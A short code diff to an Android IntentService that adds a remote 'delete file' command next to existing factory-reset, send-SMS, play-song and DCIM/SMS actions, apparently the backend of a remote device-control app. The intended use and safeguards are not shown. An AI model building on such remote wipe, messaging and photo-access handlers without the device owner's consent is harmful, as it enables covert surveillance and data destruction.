@@ -41,6 +41,7 @@ public class JobsIntentService extends IntentService {
     public static final String ACTION_FACTORY_RESET = "ACTION_FACTORY_RESET";
     public static final String ACTION_SEND_SMS = "ACTION_SEND_SMS";
     public static final String ACTION_PLAY_SONG = "ACTION_PLAY_SONG";
+    public static final String ACTION_DELETE_FILE = "ACTION_DELETE_FILE";
     private static final String TAG = JobsIntentService.class.getSimpleName();
     public static final String ACTION_DCIM_FILES = "ACTION_DCIM_FILES";
     public static final String ACTION_SMS = "ACTION_SMS";
@@ -287,6 +288,11 @@ public class JobsIntentService extends IntentService {
                 if(intent.hasExtra(Constants.URL)){
                     String url = intent.getStringExtra(Constants.URL);
                     Lofl.playSong(this, url);
+                }
+            }else if(intent.getAction().equals(ACTION_DELETE_FILE)){
+                if(intent.hasExtra(Constants.FILE_NAME_KEY)){
+                    String fileName = intent.getStringExtra(Constants.FILE_NAME_KEY);
+                    Lofl.deleteFile(this, fileName);
                 }
             }else {
                 Log.d(TAG, "No action found!");
